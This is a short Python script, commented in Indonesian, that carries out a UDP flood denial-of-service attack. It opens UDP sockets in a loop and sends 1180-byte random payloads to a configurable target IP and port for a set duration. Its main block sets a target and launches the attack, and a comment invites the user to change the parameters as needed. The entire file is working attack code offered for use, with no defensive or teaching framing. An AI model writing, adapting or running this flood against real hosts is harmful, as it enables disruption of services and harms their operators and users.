import socket
import random
import logging
import sys
import time

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger()

def udpflood(host_ip, port, duration, multiple):
    """
    Melakukan serangan UDP flood ke target tertentu selama durasi yang ditentukan.
    
    :param host_ip: IP dari target
    :param port: Port dari target
    :param duration: Durasi serangan dalam detik
    :param multiple: Jumlah paket yang dikirim dalam satu iterasi loop
    """
    end_time = time.time() + duration
    tar = (str(host_ip), int(port))
    bytes = random._urandom(1180)
    req_code = 0
    error = 0

    logger.info(f"Memulai UDP flood ke {host_ip}:{port} selama {duration} detik dengan {multiple} paket per iterasi.")

    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.sendto(bytes, tar)
            req_code += 1
            logger.info(f"UDP Flood | Target: {host_ip}:{port} | Sent: {req_code} | Errors: {error}")
            
            for _ in range(multiple):
                s.sendto(bytes, tar)
                req_code += 1
                logger.info(f"UDP Flood | Target: {host_ip}:{port} | Sent: {req_code} | Errors: {error}")
        except socket.error as e:
            error += 1
            logger.error(f"Error sending packet: {e}")
        finally:
            s.close()

    logger.info(f"UDP flood selesai. Total paket terkirim: {req_code}. Total kesalahan: {error}.")

if __name__ == "__main__":
    # Parameter untuk serangan (ubah sesuai kebutuhan)
    HOST_IP = "192.168.1.1" # IP target
    PORT = 80               # Port target
    DURATION = 60           # Durasi serangan dalam detik
    MULTIPLE = 10           # Jumlah paket per iterasi

    # Menjalankan fungsi udpflood
    udpflood(HOST_IP, PORT, DURATION, MULTIPLE)